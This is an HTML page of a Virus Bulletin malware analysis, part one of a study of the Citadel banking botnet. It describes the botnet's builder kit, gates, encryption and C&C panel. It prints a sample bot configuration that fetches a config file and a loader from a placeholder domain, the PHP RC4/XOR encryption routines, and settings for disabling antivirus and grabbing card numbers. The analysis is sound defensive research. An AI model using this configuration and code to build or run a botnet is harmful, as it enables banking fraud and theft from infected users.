<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script type="text/javascript">var BOOTSTRAP_VERSION ="lumen";
	var BOOTSTRAP_JS_HEAD =1;
	var BOOTSTRAP_CDN_ENABLE =0; var BOOTSTRAP_NAVBAR_TYPE =0; var BOOTSTRAP_LOGO_OPTION =0; var BOOTSTRAP_NAVBAR =1; var BootstrapInputFix =true;var BootstrapNavbarLineHeightFix =true;var BOOTSTRAP_EDT= 0; </script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Virus Bulletin :: Prosecting the Citadel botnet - revealing the dominance of the Zeus descendent: part one</title>
<meta name="description" content="Citadel is a sophisticated descendent of the Zeus botnet. In this two-part article, Aditya Sood and Rohit Bansal provide insight into the bot's design components, including its system infection and data exfiltration tactics." />
<meta name="generator" content="concrete5 - 5.6.3.5" />
<script type="text/javascript">
var CCM_DISPATCHER_FILENAME = '/index.php';var CCM_CID = 1729;var CCM_EDIT_MODE = false;var CCM_ARRANGE_MODE = false;var CCM_IMAGE_PATH = "/concrete/images";
var CCM_TOOLS_PATH = "/index.php/tools/required";
var CCM_BASE_URL = "https://www.virusbulletin.com";
var CCM_REL = "";

</script>
<link rel="shortcut icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="/concrete/css/ccm.base.css" />
<script type="text/javascript" src="/concrete/js/jquery.js"></script>
<script type="text/javascript" src="/concrete/js/ccm.base.js"></script>
<script type="text/javascript">
var COOKIES_ALLOWED=false;
</script>
<link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure.css" />
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure_ie.css" /><![endif]-->
<script type="text/javascript">
var COOKIES_DISCLOSURE_HIDE_INTERVAL=10;
</script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_hide.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap-overwrites.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/members.css" />
<script type="text/javascript" src="/packages/bootstrap/js/common/prettify.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="/libraries/css/jquery.fancybox.css" />
<script type="text/javascript" src="/libraries/js/jquery.fancybox.pack.js"></script>
<link rel="stylesheet" media="screen" type="text/css" href="/files/cache/css/bootstrap/typography.css" />
<script type="text/javascript" src="/index.php/tools/packages/free_cookies_disclosure/disclosure_i18n_js"></script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_ajax_form.js"></script>
<link rel="stylesheet" type="text/css" href="/concrete/blocks/page_list/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/remo_expand/blocks/remo_expand/templates/vbexpand/view.css" />
<script type="text/javascript" src="/packages/remo_expand/js/jquery.color.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/jquery.ba-hashchange.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/remo.expand.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/blocks/search/templates/VB_global_search/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/travisn_spacer/css/ccm.tnspacer.css" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">

<script src="https://cdnjs.cloudflare.com/ajax/libs/prettify/r298/run_prettify.js" integrity="sha256-1SFdTXlsw0RkQ+iO0E91LDshGiIbPiTYqJto0px4wds=" crossorigin="anonymous"></script>
<!--[if gte IE 9]>
<script src="/packages/bootstrap/js/common/modernizr.js"></script>
<![endif]-->

<!--[if lt IE 9]>	
	
	<script src="/packages/bootstrap/js/common/html5shiv.js"></script>
	<script src="/packages/bootstrap/js/common/respond.min.js"></script>
	
<![endif]-->
</head>
<body data-spy="scroll" data-target=".bs-sidebar">

<div class="navbar  navbar-fixed-top navbar-default  bs-docs-nav">
<div class="navbar-inner">
<div class="container"><div class="row"><div class="col-sm-4 col-md-4 logo-position-1 col-logo">
<div class="navbar-header">
<button type="button" class="navbar-toggle btn_navbar_custom">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button><div class="mobile-clearfix"></div><div class="navbar-brand navbar-brand-area"><a href="/"><img border="0" class="ccm-image-block" alt="" src="/files/4614/4535/7515/logo-big.png" width="339" height="92" /></a></div> </div>
</div><div class="col-sm-8 col-md-8 logo-position-1 col-nav"> <div class="nav-collapse collapse nav_collapse_custom navbar-collapse"> <div style="clear:both"></div>
<div class="vb-global-search-div">
<form action="/index.php/global-search-results/" method="get">
<fieldset>
<input name="search_paths[]" type="hidden" value="" />
<input name="query" type="text" class="vb-global-search" placeholder="Search site..." />
<input name="submit" type="submit" value="Search!" style="display:none" />
</fieldset>
</form>
</div>
<div class="tnSpacer" style="height:48px"></div>
<ul class="nav nav-pills"><li class=" nav-first nav-item-6299"><a href="/newsletter/" target="_self" class=" nav-first nav-item-6299 ">Newsletter</a></li><li class=" nav-item-260"><a href="/conference/" target="_self" class=" nav-item-260 ">VB Conference</a></li><li class=" nav-item-166"><a href="/testing/" target="_self" class=" nav-item-166 ">VB Testing</a></li><li class=" nav-path-selected active nav-item-160"><a href="/virusbulletin/" target="_self" class=" nav-path-selected active nav-item-160 ">Bulletin</a></li><li class=" nav-last nav-item-130"><a href="/blog/" target="_self" class=" nav-last nav-item-130 ">Blog</a></li></ul> </div>
</div>
</div><div class="clearfix"></div>
</div>
</div>
</div>
<div class="navbar-top-fixed-space "><div class="clearfix"></div></div>

<div class="container m-top-20">
<div class="row">
<div class="col-md-9 col-sm-9 col-lg-9">
<div class="titlepage" xmlns=""><div><div><h1 class="title" xmlns="http://www.w3.org/1999/xhtml"><a id="vb201409-Citadel-1"></a>Prosecting the Citadel botnet - revealing the dominance of the Zeus descendent: part one</h1></div><div><p class="pubdate" xmlns="http://www.w3.org/1999/xhtml">2014-09-02</p></div><div><div class="authorgroup" xmlns="http://www.w3.org/1999/xhtml"><div class="author titlepage"><h3 class="author"><span class="firstname">Aditya K.</span> <span class="surname">Sood</span></h3><span class="orgname">Michigan State University</span>, <span class="orgdiv">USA</span></div><div class="author titlepage"><h3 class="author"><span class="firstname">Rohit</span> <span class="surname">Bansal</span></h3><span class="orgname">Independent Security Researcher</span>, <span class="orgdiv">USA</span></div><b class="editedby">Editor: </b><span class="editor"><span class="firstname">Martijn</span> <span class="surname">Grooten</span></span></div></div><div><div class="abstract" xmlns="http://www.w3.org/1999/xhtml"><p class="title"><b>Abstract</b></p><p>Citadel is a sophisticated descendent of the Zeus botnet. In this two-part article, Aditya Sood and Rohit Bansal provide insight into the bot&#39;s design components, including its system infection and data exfiltration tactics.</p></div></div><div><p class="copyright" xmlns="http://www.w3.org/1999/xhtml"><i>Copyright &copy; 2014 Virus Bulletin</i></p></div></div><hr /></div>
<div class="ccm-remo-expand">
<div id="ccm-remo-expand-title-2649" class="ccm-remo-expand-title ccm-remo-expand-closed" data-expander-speed="200">Table of contents</div><div id="ccm-remo-expand-content-2649" class="ccm-remo-expand-content"><div class="toc"><dl><dt><span class="sect1"><a href="#id4135741"></a></span></dt><dt><span class="sect1"><a href="#id3617226">1. Introduction</a></span></dt><dt><span class="sect1"><a href="#id3240872">2. Related work</a></span></dt><dt><span class="sect1"><a href="#id4335576">3. Methodology</a></span></dt><dt><span class="sect1"><a href="#id3426776">4. Citadel&#39;s design and implementation</a></span></dt><dd><dl><dt><span class="sect2"><a href="#id4508986">4.1 Builder kit</a></span></dt><dt><span class="sect2"><a href="#id2742212">4.2 Gaskets/gates </a></span></dt><dt><span class="sect2"><a href="#id2129108">4.3 Encryption/decryption design</a></span></dt><dt><span class="sect2"><a href="#id4336151">4.4 Main admin panel</a></span></dt><dt><span class="sect2"><a href="#id4372025">4.5 Citadel modules</a></span></dt></dl></dd><dt><span class="bibliography"><a href="#id3332293">Bibliography</a></span></dt></dl></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4135741"></a></h2></div></div></div><p>Recent years have seen a significant rise in cybercriminal activities, and in particular the theft of online banking credentials. The majority of cybercriminals use automated exploitation frameworks to infect computers and exfiltrate data. The most widely used weapons in this type of cybercrime are botnets. Botnets have been in existence for many years, but their design frameworks have changed over time. We are now seeing a third generation of botnets that are targeting the users of online financial services. This era of targeted attacks started with the rival Zeus and SpyEye botnets and is evolving. In this paper, we look at the design and working details of the Citadel botnet. Citadel, which is believed to have European origins, is a sophisticated descendent of the Zeus botnet. Our analysis provides insight into the design components of Citadel, including its system infection and data exfiltration tactics.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3617226"></a>1. Introduction</h2></div></div></div><p>Cybercrime is increasing because it is a lucrative business. In turn, this has led to a growth in crimeware services as well as automated exploitation and malware infection frameworks [<span class="citation"><a href="#citation.1">1</a></span>]. Botnets play a crucial role in that growth, with successful botnets containing large numbers (sometimes millions) of infected computers. Amassing such a large network of bots requires automation, and browser exploit packs (BEPs) have become the primary tool for automating the browser exploitation process. Drive-by download attacks drive users to BEPs, which then infect the users&rsquo; computers. In 2008, Provos <span class="emphasis"><em>et al.</em></span> [<span class="citation"><a href="#citation.2">2</a></span>] collected approximately three million malicious URLs hosting BEPs, accounting for 1.3% of all first-page Google search query results over a period of 10 months. Vulnerable browsers are exploited and malicious payloads are executed, with droppers downloaded onto victims&rsquo; systems. The droppers then extract the bots and install them silently. </p><p>Botnets like Zeus (or Zbot) have redefined cybercrime because of their skilled design and ability to target online financial and banking institutions. SpyEye appeared shortly after Zeus, and although the two were rivals, they shared several attack techniques. Next came ICE IX, a variant of Zeus, followed by a number of other botnets. Andromeda, Cridex and UPas are not widespread (at the time of writing this paper), but the Citadel botnet has been successful in spreading broadly across the Internet. Citadel is considered to be the child prodigy of Zeus, inheriting its functionality and attack methods, but improving them to work better with emerging technologies. <span class="emphasis"><em>McAfee</em></span> has released a detailed study of Citadel [<span class="citation"><a href="#citation.3">3</a></span>], finding that it started in Germany and the Netherlands, and first targeted European sites. The study also looked at the different campaigns started by Citadel over a period of two years in order to understand its infection rate. </p><p>Citadel uses several different techniques for conducting financial fraud, but the predominant one is the Automated Transfer System (ATS) attack for executing hidden transactions. A recent analysis of attacks against <span class="emphasis"><em>NBC</em></span> [<span class="citation"><a href="#citation.4">4</a></span>],[<span class="citation"><a href="#citation.5">5</a></span>] suggests that Citadel is spreading globally. Interestingly, the attack is designed to manipulate traffic from a number of different banking websites [<span class="citation"><a href="#citation.6">6</a></span>], including <span class="emphasis"><em>Chase</em></span>, <span class="emphasis"><em>Wells Fargo</em></span> and <span class="emphasis"><em>Bank of America</em></span>. An earlier study by CERT Polska [<span class="citation"><a href="#citation.7">7</a></span>] suggests that the majority of Citadel botnet traffic originates from Europe and Japan, of which 77% comes from Poland. Citadel is primarily motivated to attack banking websites from the client side because that is where the money is. </p><p>Due to the fact that Citadel is designed for theft, it has become popular in the underground community &ndash; and fraudsters are willing to pay for access to it. As a result, Citadel is available as part of a number of crimeware services packages. It is important for us to dissect the Citadel botnet in order to understand its low level details so that better protection mechanisms can be designed. In this paper, we present the complete design of the Citadel botnet, including the details of various components and their functions. We will describe the bot&rsquo;s behaviour, and then look at what might be next for the Citadel botnet. </p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3240872"></a>2. Related work</h2></div></div></div><p>Botnet analysis in general helps security analysts and defenders to understand the design of botnets and the stealthy techniques that are used to circumvent existing protection and detection mechanisms. A number of different botnets have previously been analysed in order to gain better insight into their exploitation tactics. Botnet analysis is a continuous process because of the ever-evolving nature of these automated frameworks.</p><p>In 2011, Yan <span class="emphasis"><em>et al.</em></span> [<span class="citation"><a href="#citation.8">8</a></span>] analysed RatBot&rsquo;s techniques for bypassing multiple methods used by other adversaries (such as other bots) in the system. These actions show that bot wars [<span class="citation"><a href="#citation.9">9</a></span>] still exist. In 2009, Stone-Gross <span class="emphasis"><em>et al</em></span>. [<span class="citation"><a href="#citation.10">10</a></span>] analysed the Torpig botnet over a period of several days in order to determine the volume of information stolen by the botnet through several data exfiltration methods. In an earlier study, we presented a complete design analysis of the SpyEye botnet [<span class="citation"><a href="#citation.11">11</a></span>], which dissected the component-based functionality of SpyEye to reveal how the design transforms over time. We detailed several variants of SpyEye that provided a deeper understanding of the botnet&rsquo;s design. In 2010, Borgaonkar [<span class="citation"><a href="#citation.12">12</a></span>] presented an analysis of the Asprox botnet, which used an SQL injection attack to infect a large number of websites in order to distribute bot binaries. In 2009, Stock<span class="emphasis"><em> et al.</em></span> [<span class="citation"><a href="#citation.13">13</a></span>] analysed the Waledac botnet by implementing a clone of the botnet called &lsquo;Walowdac&rsquo; in order to perform large-scale traffic analysis to determine the success rate of malicious phishing and spamming campaigns. </p><p>In 2010, Binsalleeh <span class="emphasis"><em>et al. </em></span>[<span class="citation"><a href="#citation.14">14</a></span>] reverse engineered Zeus bot binaries in order to understand their code. Their approach was to extract the encryption keys by analysing code. That, in turn, helped them to decrypt the network traffic of Zeus as it communicated with its command and control (C&amp;C) panel. In 2012, Lin and Lee [<span class="citation"><a href="#citation.15">15</a></span>] proposed a pebble trace technique for tracking malicious actors (bot herders) running C&amp;C panels in the cloud without any use of existing technologies such as routing notifications, deployment monitoring and ISP support. Their prototype was tested against the Zeus botnet to traverse multiple layers of the cloud by identifying the cryptographic keys used in the configuration and deployment of a large number of Zeus bots. </p><p>In 2010, Sinha <span class="emphasis"><em>et al. </em></span>[<span class="citation"><a href="#citation.16">16</a></span>] dissected the Mariposa botnet in order to understand its architecture, C&amp;C traffic flow and resultant impacts. Also in 2010, Celeda <span class="emphasis"><em>et al. </em></span>[<span class="citation"><a href="#citation.17">17</a></span>] unveiled their analysis of the Chuck Norris botnet, which basically exploits the vulnerabilities present in SOHO embedded device components such as firmware. The characteristics and design of the Chuck Norris botnet make it different from other botnets because it compromises gateway devices rather than end-user machines. </p><p>Finally, in 2012, <span class="emphasis"><em>AhnLab</em></span> released a technical report detailing its researchers&rsquo; static analysis of Citadel [<span class="citation"><a href="#citation.18">18</a></span>]. Our goal is to expand on the previous research on Citadel, so we concentrate on the design and behaviour of various of its components. </p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4335576"></a>3. Methodology</h2></div></div></div><p>As discussed earlier, researchers use different techniques and tactics for botnet analysis depending on the availability of data and samples. In our study, we used both static and behavioural techniques to gather information. We began with several interesting steps to collect data for our experiments:</p><div class="itemizedlist"><ul type="disc"><li><p>We used the technique of back-tracking, in which we analysed the complete attack vectors used in targeted phishing attacks that coerced (or tricked) users into visiting malicious domains serving samples of Citadel. This process requires de-obfuscation of JavaScript, network hopping, etc. to find the exploit frameworks serving the Citadel bot. </p></li><li><p>We executed a large set of experiments in an emulated and specially designed test environment in which the bot is executed in a controlled manner with basic configuration settings. Of particular importance is the fact that the bot is allowed to connect back to the C&amp;C panel. This strategy allowed us to understand the communication patterns used by the botnet in transmitting data to its C&amp;C panel.</p></li><li><p>We also used techniques such as reverse engineering and debugging to analyse the Citadel samples as a part of static analysis. In addition, behavioural testing revealed the modifications made to data structures, the file system, registry and network connections. To automate the process of network analysis, we built an IPS/IDS signature for the Citadel botnet that helped us detect malicious domains running C&amp;C panels.</p></li><li><p>We used penetration testing and vulnerability hunting to find loopholes such as vulnerabilities and configuration flaws in the malicious servers hosting C&amp;C panels. We tried this approach for assurance purposes, but the outcome of this experiment depends on the insecure design of botnets. </p></li></ul></div><p>Altogether, our data-gathering techniques resulted in a useful set of information to support our analytical results. We looked at Citadel versions ranging from 1.3.3.x to 1.3.5.x. </p><p>Section 4 of this article covers the design of the Citadel botnet, including the functionality of different components, and in part two, we present the results and analysis of our experiments. </p><p>We refer to the bot as a malicious executable (including the dropper) that infects the target system. </p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3426776"></a>4. Citadel&#39;s design and implementation</h2></div></div></div><p>In this section, we present the complete design of the Citadel botnet including its components and modules. </p><p>Rather than following the traditional approach used by botnet developers to interact with their clients, Citadel&rsquo;s developers opted to follow the professional Customer Relationship Management (CRM) approach. This change is an indication of the fact that the management of crimeware services is becoming more sophisticated. Generally, botnet developers use ICQ/IRC channels to handle support requests, but there are two major problems with this approach. First, one can ignore a request on an IRC channel. Second, this places a tremendous load on an individual support person because of the high volume of requests to be addressed. To overcome these issues, the Citadel developers follow a CRM model in which software problems or requests are addressed using a ticketing system. That is, a client initiates a ticket to report a bug, which notifies a developer of a problem that needs attention. CRM also adds value as it allows any client to provide feedback and exchange ideas with the developers. In addition, Citadel&rsquo;s owners have incorporated the <span class="emphasis"><em>Jabber</em></span> instant messaging service to send updates about developments and patches directly to the IRC channel used by the clients. In this way, users can be updated without needing to visit the CRM portal. Clients can also request new functionality by placing either public or private bids &ndash; public bids are available to all, whereas private ones are specifically for the intended client. This last feature allows the Citadel owners to cater to an individual client&rsquo;s needs by building more advanced components and plug-ins for the botnet. It is analogous to a model in which clients submit their votes for the development of new features by paying an amount of money determined by the bidding process. </p><p>Citadel&rsquo;s design is similar to that of earlier botnets such as Zeus and SpyEye. It consists of a set of components including a builder kit, command and control (C&amp;C) panel and several modules, as shown in <a href="#figure.1">Figure 1</a>. </p><div class="figure"><a id="figure.1"></a><div class="mediaobject"><img alt="Basic components of Citadel." src="/uploads/images/figures/2014/09/Citadel-fig1.jpg" /></div><p class="title"><b>Figure&nbsp;1.&nbsp;Basic components of Citadel.</b></p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4508986"></a>4.1 Builder kit</h3></div></div></div><p>The builder kit is used for building the bot after it has been dropped onto a user&rsquo;s computer. It can be customized using different configuration parameters. At the time of building, the bot&rsquo;s configuration is defined in a config.txt file (other names can be used) and the configuration parameters are also used to generate a config.bin file, which is embedded in the bot itself. The C&amp;C can later update the bot by sending a new, encrypted config.bin file. The build process entails several steps, as described below:</p><div class="itemizedlist"><ul type="disc"><li><p>An authorization key (login key) is required, which protects the C&amp;C and the bot. The key is placed in the &lsquo;global.php&rsquo; file on the C&amp;C server as: define (&lsquo;BO_LOGIN_KEY&rsquo;, &lsquo;PUT_KEY_HERE&rsquo;). In addition to this, an API key is also defined as: (&lsquo;API_TOKEN_KEY&rsquo;, &lsquo;PUT_KEY_HERE&rsquo;). The use of &lsquo;api.php&rsquo; is restricted to the bot only. These keys are required in order for the bot to access the gate (sometimes named gate.php), which must be passed in order to communicate with the C&amp;C (cp.php) panel. In order to access the C&amp;C panel, Citadel uses either basic or form based authentication, depending on the choices made by the bot herder. The C&amp;C panel directory is restricted using htaccess and htpasswd, so that only the bot herder&rsquo;s IP is al-lowed to connect to the C&amp;C panel. <a href="#figure.2">Figure 2</a> shows the layout of the Citadel builder. </p><div class="figure"><a id="figure.2"></a><div class="mediaobject"><img alt="Citadel builder kit." src="/uploads/images/figures/2014/09/Citadel-fig2.jpg" /></div><p class="title"><b>Figure&nbsp;2.&nbsp;Citadel builder kit.</b></p></div></li><li><p>Once the web structure is set, the config.txt file is built. The configuration file consists of entries for the different modules to be added and includes timing parameters. In addition to this, it covers information relating to the encryption settings, URL settings for the bot, C&amp;C, gate and configuration in the binary format. An example of a simple Citadel configuration file is shown in Listing 1. </p><pre class="programlisting"><span class="bold"><strong># Setting the modules in the following format</strong></span>
entry &quot;Video&quot;
    a quality
    length 30
  end
<span class="bold"><strong># Setting the encryption key</strong></span>
encryption_key &quot;key&quot;
<span class="bold"><strong># Setting the  primary entry for the configuration file in the binary format</strong></span>
url_config1 &quot;http://[domain]/file.php|file=config.bin&quot;
<span class="bold"><strong># Setting the backup entry for the configuration file in the binary format</strong></span>
url_config2 &quot;http://[domain]/file.php|file=config.bin&quot;
<span class="bold"><strong># Setting the path for the loader to load the bot</strong></span>
url_loader &quot;http://[domain]/file.php|file=citadel.exe&quot;
<span class="bold"><strong># Setting the entry for gate</strong></span>
url_server &quot;http://localhost/gate.php&quot;


<span class="bold"><strong>Listing 1: Layout of Citadel configuration file.</strong></span>
</pre></li></ul></div><p><a href="#table.1">Table 1</a> lists the different configuration settings used in Citadel.</p><div class="table"><a id="table.1"></a><table border="1" summary="List of configuration settings used by Citadel."><colgroup><col /><col /></colgroup><thead><tr><th align="center">Citadel configuration</th><th align="center">Description</th></tr></thead><tbody><tr><td>encryption_key</td><td>Setting the encryption key</td></tr><tr><td>entry/end</td><td>Defining the name of the module</td></tr><tr><td>url_loader</td><td>Path from which the bot is loaded</td></tr><tr><td>url_config</td><td>Path from which the configuration file is fetched</td></tr><tr><td>url_server</td><td>Path to the gate</td></tr><tr><td>disable_cookies</td><td>To disable cookies [0/1]</td></tr><tr><td>disable_antivirus</td><td>To configure the mini AV functionality [0/1]</td></tr><tr><td>enable_luhn10_get</td><td>Enables the Card Swipe plug-in to verify the CC number, scans the GET request and dumps it [0/1]</td></tr><tr><td>enable_luhn10_post</td><td>Enables the Card Swipe plug-in to verify the CC number, scans the POST request and dumps it [0/1]</td></tr><tr><td>remove_certs</td><td>Manage certificates on the infected machine [0/1]</td></tr><tr><td>timer_autoupdate</td><td>Setting time to auto update the bot and download additional plug-ins</td></tr><tr><td>disable_httpgrabber</td><td>Manage the HTTP grabber plug-in [0/1]</td></tr><tr><td>report_software</td><td>Manage the bot&rsquo;s ability to send information about the installed software from the infected machine [0/1]</td></tr><tr><td>antiemulation_enable</td><td>Manage virtual machine (VM) detection [1/0]</td></tr><tr><td>timer_config [N1] [N2]</td><td>Time (minutes) defined to update the bot with new configuration</td></tr><tr><td>timer_logs[N1] [N2]</td><td>Time (minutes) after which bot knocks C&amp;C to transmit collected logs</td></tr><tr><td>timer_stats [N1] [N2]</td><td>Time (minutes) after which bot knocks C&amp;C to provide stats</td></tr><tr><td>timer_modules [N1] [N2]</td><td>Time (minutes) defined to update the bot with new modules</td></tr><tr><td>timer_autoupdate [N1]</td><td>Time (hours) to update the bot executable with new crypt (obfuscation) code</td></tr><tr><td><span class="emphasis"><em>[N1] is the time that defines a successful operation; [N2] is the time that defines an unsuccessful operation </em></span></td><td class="auto-generated">&nbsp;</td></tr></tbody></table><p class="title"><b>Table&nbsp;1.&nbsp;List of configuration settings used by Citadel.</b></p></div></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2742212"></a>4.2 Gaskets/gates </h3></div></div></div><p>Beginning with Zeus, botnet authors started to implement gates, and Citadel is no different. The gates are called &lsquo;gaskets&rsquo; in Citadel&rsquo;s terminology, i.e. components that join two surfaces. In a botnet, the gates work as intermediate components to route bot communications to the C&amp;C panel. The bot does not connect directly to the C&amp;C; instead, it first has to pass through the gate which allows the C&amp;C communication. Citadel also checks for a particular destination IP address before allowing bots to communicate. This additional check helps hide the C&amp;C from security analysts. The builder outputs two files: &lsquo;file.php&rsquo; (sometimes named &lsquo;gate.php&rsquo;) and &lsquo;file_config.php&rsquo;. The &lsquo;file.php&rsquo; file is the main gate component, which handles all the requests from different bots, whereas &lsquo;file_config.php&rsquo; contains configuration parameters, taken from the main configuration (config.bin) file, for the proper functioning of the gate. The &lsquo;file_config.php&rsquo; file contains the encryption key in a modified form extracted from the config.bin file. Including the key in the configuration files facilitates inclusion of the key in &lsquo;file.php&rsquo;. The gate component (file.php) can be deployed on the same server or a different one and is restricted by using an htaccess file. Since the gate component is designed in PHP, it is essential that the deployed PHP configuration on the C&amp;C server supports sockets, otherwise the gate component will fail. It is also possible to seal the gate component by configuring redirect rules (redir.php). </p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2129108"></a>4.3 Encryption/decryption design</h3></div></div></div><p>Encryption is implemented in botnets to protect the communication channel and to make analysis harder. Typically, botnets such as Zeus and Citadel implement encryption at two specific places: the HTTP communication channel and the binary. All of the POST requests sent to the C&amp;C panel are encrypted, thus significantly increasing the difficulty of deducing communication details. In our traffic analysis, we found that Citadel first sends an encrypted POST request to the gateway before downloading the config.bin file. This action enhances the security of the download because the gateway requires specific data from the bot in order to fetch the config.bin file. We believe that this POST request carries the login information because Citadel requires a login key in addition to an encryption key. The mechanism used by Citadel to fetch its configuration file is different from that used by Zeus. The mechanism means that analysts will not be able to fetch the config.bin file directly by sending a GET request (as can be done in Zeus) &ndash; making analysis significantly more difficult. </p><p>The earlier version of Citadel (1.3.3.1) used an encryption pattern similar to Zeus&rsquo;s in which visualEncrypt and visualDecrypt functions were used with RC4 encryption. Citadel enhanced this encryption by using MD5 (login_key) and encryption_key together to perform encryption. Listing 2 shows how the VisualEncrypt, VisualDecrypt and RC4 functions are deployed in Zeus and Citadel. </p><pre class="programlisting">function visualEncrypt(&amp;$data)
{
  $len = strlen($data); for($i = 1; $i &lt; $len; $i++) $data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
}
function visualDecrypt(&amp;$data)
{
  $len = strlen($data);
  if($len &gt; 0) for($i = $len - 1; $i &gt; 0; $i--) $data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
}
function rc4(&amp;$data, $key)
{
  $len = strlen($data);
  $loginKey = BO_LOGIN_KEY;
  $loginKeyLen = strlen(BO_LOGIN_KEY);
  for($z = $y = $x = $w = 0; $x &lt; $len; $x++)
  {
    $z = ($z + 1) % 256;
    $y = ($y + $key[$z]) % 256;
    $tmp      = $key[$z];
    $key[$z]  = $key[$y];
    $key[$y]  = $tmp;
    $data[$x] = chr(ord($data[$x]) ^ ($key[(($key[$z] + $key[$y]) % 256)]));
    $data[$x] = chr(ord($data[$x]) ^ ord($loginKey[$w]));
    if (++$w == $loginKeyLen) $w = 0;
  }
}
# Zeus 2.0.8.9 encryption steps
$v_encrypt = visualEncrypt($Data);
$encrypted_data = rc4( $v_encrypt, $config[&#39;botnet_cryptkey_bin&#39;]);
# Citadel 1.3.3.1 encryption steps
$final_key = rc4(md5($login_key),  $encryption_key)
$v_encrypt = visualEncrypt($Data);
$encrypted_data = rc4($v_encrypt, $final_key)

<span class="bold"><strong>Listing 2: Citadel encryption prototype.</strong></span>
</pre><p>However, Citadel (1.3.4.5) changed the encryption process because decrypting the previous one was trivial. To make it more complex, the encryption process first added layers with the introduction of a salt value and XOR functions. Next, the core design started supporting AES encryption. As a result, the encryption process outputs AES-128 secure encrypted data for communication between the bot and the gateway. <span class="emphasis"><em>SophosLabs</em></span> researchers presented an interesting analysis of the encryption and decryption process in the Citadel botnet, showing how AES is used <a href="#citation.19">19</a>. One reason Citadel enhanced its encryption process was that earlier versions of the bot were being detected by the<span class="emphasis"><em> Zeus Tracker</em></span> service [<span class="citation"><a href="#citation.20">20</a></span>]. To avoid this detection, the encryption code needed to be strengthened. </p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4336151"></a>4.4 Main admin panel</h3></div></div></div><p>The main administration panel is also known as the command &amp; control (C&amp;C) panel and it controls all the infected computers running the Citadel bot. The Citadel C&amp;C panel is written in PHP and the default name used is &lsquo;cp.php&rsquo;. The C&amp;C panel has the following functions:</p><div class="itemizedlist"><ul type="disc"><li><p>It manages all the bots running on infected computers and provides a centralized platform for communication and management.</p></li><li><p>It issues commands to bots to update their configuration and rules.</p></li><li><p>It stores all the data exfiltrated from the infected computers in its database. The C&amp;C panel provides a nice web interface to facilitate interaction with the database and retrieve the stolen information.</p></li><li><p>It manages all the different modules, such as the video grabber, screen grabber and web injects. It commands the bots to update these modules accordingly.</p></li><li><p>It builds reports by performing statistical analysis on the information exfiltrated from infected computers. </p></li></ul></div><p><a href="#figure.3">Figure 3</a> shows the layout of Citadel&rsquo;s main admin panel. </p><div class="figure"><a id="figure.3"></a><div class="mediaobject"><img alt="Citadel&rsquo;s main admin panel." src="/uploads/images/figures/2014/09/Citadel-fig3.jpg" /></div><p class="title"><b>Figure&nbsp;3.&nbsp;Citadel&rsquo;s main admin panel.</b></p></div><p>(Click <a href="/uploads/images/figures/2014/09/Citadel-fig3-large.jpg" target="_top">here</a> to view a larger version of Figure 3.)</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4372025"></a>4.5 Citadel modules</h3></div></div></div><p>The different modules supported by Citadel are discussed in the following sections.</p><div class="sect3" lang="en"><div class="titlepage"><div><div><h4 class="title"><a class="chapter" id="id2618761"></a>4.5.1 Video grabber and screenshot stealer</h4></div></div></div><p>Video grabbing is a data exfiltration technique in which a bot records videos when a user is interacting with the browser to surf the Internet. For example, the bot may record a video when a user is transferring money from his or her personal bank account. Citadel stores the stolen videos in HTML5 video format for later viewing by the bot herder from the main admin panel. In addition, Citadel implements an API for managing the videos. These APIs generate HTML-based codes with embedded videos that are accessed directly from the bots running on infected machines. This means that the bot herder can embed the HTML code containing the videos anywhere in a third-party website without the need to access the main admin panel. This enhances mobility, and at the same time provides security because the stolen videos can be watched from different places. These videos can also be viewed directly in an online media player using this API. <a href="#table.2">Table 2</a> shows the API queries for this functionality. </p><div class="table"><a id="table.2"></a><table border="1" summary="Details of the video-grabber API."><colgroup><col 